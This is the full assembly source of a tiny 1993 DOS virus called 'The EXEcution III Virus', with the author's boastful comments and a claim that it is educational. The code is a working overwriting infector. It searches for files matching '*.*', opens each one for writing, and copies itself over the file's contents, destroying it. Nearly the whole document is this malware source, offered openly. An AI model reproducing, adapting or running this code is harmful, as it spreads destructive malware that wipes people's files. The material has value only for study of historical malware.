; The EXEcution III Virus.
;
; Well, you're now the prouw owner of the smallest virus ever made!
; only 23 bytes long and ofcourse again very lame..
; But what the heck, it's just an educational piece of code!!
;
; (C) 1993 by [D‡RkR‡Y] of TridenT (Ooooooranje Boooooooven!)
;
; Tnx to myself, my assembler, DOS (yuck) and to John Tardy for his
; nice try to make the smallest (27 bytes and 25 bytes) virus... gotcha!! ;-))
;
; BTW Don't forget, I only tested it unter DOS 5.0 so on other versions
; it might not work!

_CODE   SEGMENT
        ASSUME  CS:_CODE

        ORG     100h
START:                                 ; That's where we're starting...
        FILE    DB '*.*',0h            ; Dummy instruction, SUB's 0FFh from CH

        MOV     AH,4Eh                 ; Let's search!
DO_IT:  MOV     DX,SI                  ; Make DX = 100h (offset file)
        INT     21h                    ; Search now dude!

        MOV     AX,3D01h               ; Hmm, infect that fucking file!
        MOV     DX,9Eh                 ; Name is at DS:[9Eh]
        INT     21h                    ; Go do it!
        XCHG    BX,AX                  ; Put the handle in BX

        MOV     AH,40h                 ; Write myself!
        JMP     DO_IT                  ; Use other routine

_CODE   ENDS
        END     START

; If you don't like my english: Get lost, you can understand it!
